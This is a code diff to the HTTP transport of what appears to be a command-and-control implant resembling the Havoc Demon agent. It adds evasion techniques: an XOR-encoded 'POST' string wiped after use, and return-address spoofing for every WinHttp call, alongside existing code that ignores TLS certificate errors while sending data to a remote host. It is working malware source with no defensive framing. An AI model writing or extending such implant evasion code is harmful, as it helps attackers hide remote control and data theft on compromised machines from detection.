@@ -3,6 +3,7 @@
 #include <Transport.h>
 #include <Command.h>
 #include <Core.h>
+#include <Spoof.h>
 
 #include <iptypes.h>
 #include <iphlpapi.h>
@@ -13,6 +14,17 @@
     memset( d, 0, l ); \
     LocalFree( d ); \
     d = NULL;
+
+/* HTTP verb, XOR-encoded (key 0x5A per byte) so "POST" does not sit in .rdata */
+static const UCHAR VerbXor[ 10 ] = { 0x0A, 0x5A, 0x15, 0x5A, 0x09, 0x5A, 0x0E, 0x5A, 0x5A, 0x5A };
+
+/* Call a WinHttp API through the return-address spoofing trampoline when a
+ * kernel32 gadget is available (SpoofInit), else directly — either way the
+ * same import is used, only the visible return address differs. */
+#define SPOOF_NARG( _1,_2,_3,_4,_5,_6,_7,_8,N,... ) N
+#define SPOOF_PICK( ... ) SPOOF_NARG( __VA_ARGS__, SPOOF_G, SPOOF_F, SPOOF_E, SPOOF_D, SPOOF_C, SPOOF_B, SPOOF_A, SPOOF_X )
+#define SPOOF_CALL( fn, ... ) \
+    ( SpoofReady() ? ( HANDLE ) SPOOF_PICK( fn, __VA_ARGS__ )( fn, __VA_ARGS__ ) : ( HANDLE ) ( fn( __VA_ARGS__ ) ) )
 
 BOOL TransportInit( )
 {
@@ -167,13 +179,21 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     LPCWSTR HttpProxy       = NULL;
     DWORD   BufRead         = 0;
     UCHAR   Buffer[ 1024 ]  = { 0 };
+    WCHAR   HttpVerb[ 6 ]   = { 0 };
     PVOID   RespBuffer      = NULL;
     SIZE_T  RespSize        = 0;
     BOOL    Successful      = FALSE;
 
     HttpEndpoint = Instance.Config.Transport.Endpoint;
 
-    hSession = WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
+    /* decode the HTTP verb off .rdata */
+    {
+        SIZE_T i;
+        for ( i = 0; i < sizeof( VerbXor ); i++ )
+            ( ( PUCHAR ) HttpVerb )[ i ] = VerbXor[ i ] ^ 0x5A;
+    }
+
+    hSession = SPOOF_CALL( WinHttpOpen, Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
     if ( ! hSession )
     {
         Dbg( "WinHttpOpen: Failed => %d\n", GetLastError() );
@@ -181,7 +201,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         goto LEAVE;
     }
 
-    hConnect = WinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
+    hConnect = SPOOF_CALL( WinHttpConnect, hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
     Dbg( "> WinHttpConnect=> %d\n", GetLastError() );
     if ( ! hConnect )
     {
@@ -196,7 +216,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         HttpFlags |= WINHTTP_FLAG_SECURE;
     }
 
-    hRequest = WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
+    hRequest = SPOOF_CALL( WinHttpOpenRequest, hConnect, ( LPCWSTR ) HttpVerb, HttpEndpoint, NULL, NULL, NULL, HttpFlags );
     Dbg( "> WinHttpOpenRequest=> %d\n", GetLastError() );
 
     if ( ! hRequest )
@@ -212,7 +232,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-        if ( ! WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
+        if ( ! SPOOF_CALL( WinHttpSetOption, hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
         {
             Dbg( "WinHttpSetOption: Failed => %d\n", GetLastError() );
         }else{
@@ -224,14 +244,14 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     // Send our data
     // PRINT_HEX(Data, Size)
 
-    if ( WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, 0x0 ) )
+    if ( SPOOF_CALL( WinHttpSendRequest, hRequest, NULL, 0, Data, Size, Size, 0x0 ) )
     {
-        if ( RecvData && WinHttpReceiveResponse( hRequest, NULL ) )
+        if ( RecvData && SPOOF_CALL( WinHttpReceiveResponse, hRequest, NULL ) )
         {
             RespBuffer = NULL;
             do
             {
-                Successful = WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
+                Successful = SPOOF_CALL( WinHttpReadData, hRequest, Buffer, 1024, &BufRead );
                 if ( ! Successful || BufRead == 0 )
                 {
                     if ( ! Successful )
@@ -272,6 +292,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     }
 
 LEAVE:
+    memset( HttpVerb, 0, sizeof( HttpVerb ) ); /* clear the decoded verb from the stack */
     WinHttpCloseHandle( hSession );
     WinHttpCloseHandle( hConnect );
     WinHttpCloseHandle( hRequest );
